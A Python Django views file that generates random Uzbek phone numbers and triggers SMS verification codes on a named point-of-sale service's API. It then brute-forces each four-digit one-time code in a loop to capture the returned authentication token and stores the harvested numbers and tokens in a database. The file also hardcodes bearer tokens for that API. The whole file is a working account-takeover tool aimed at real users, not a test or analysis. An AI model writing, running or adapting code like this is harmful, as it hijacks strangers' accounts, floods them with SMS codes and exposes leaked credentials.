from django.http import HttpResponse
from django.shortcuts import render
from random import randint
from .models import Profile
import requests
import time

def get_token(phone):
    url = "https://api.webpos.uz/api/client/checksms"
    header = {
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJVc2VyIiwibmJmIjoxNjQ0OTE1MzkwLCJleHAiOjE3MjQxMTUzOTAsImlzcyI6Imh0dHBzOi8vYXBpLmV2b3MtcHJvZC51eiIsImF1ZCI6IkVWT1MifQ.VyilxSNBenbbYNpRm_hBCsHbzJXS4SEaZ4JjnggZJ5"
    }
    for i in range(4500, 10000):
        data = {
            "phoneNumber": f"{phone}",
            "code": f"{i}"
        }
        try:
            response = requests.post(url=url, json=data, headers=header)
            time.sleep(0.03)
            if response.status_code == 200:
                print(response.json())
                return response.json()['result']
        except Exception as e:
            print(e, i)



def get_phone_view():
    for i in range(100000):
        phone = randint(930000000, 949999999)
        phone_number = '+998' + str(phone)
        if not Profile.objects.filter(phone=phone_number).exists():
            url = 'https://api.webpos.uz/api/client/sendsms'
            data = {
                "phoneNumber": phone_number,
            }
            header = {
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJVc2VyIiwibmJmIjoxNjQ0OTE1MzkwLCJleHAiOjE3MjQxMTUzOTAsImlzcyI6Imh0dHBzOi8vYXBpLmV2b3MtcHJvZC51eiIsImF1ZCI6IkVWT1MifQ.VyilxSNBenbbYNpRm_hBCsHbzJXS4SEaZ4JjnggZJ5U"
            }
            try:
                response = requests.post(url=url, json=data, headers=header)
            except Exception as e:
                print(e, i)
                continue
            print(response.status_code, response.json(), phone_number)
            if response.status_code == 200:
                print(response.json(), phone_number)
                token = get_token(phone_number)
                Profile.objects.create(phone=phone_number, token=token).save()
                print(phone, token)
    return HttpResponse('Hello World!')
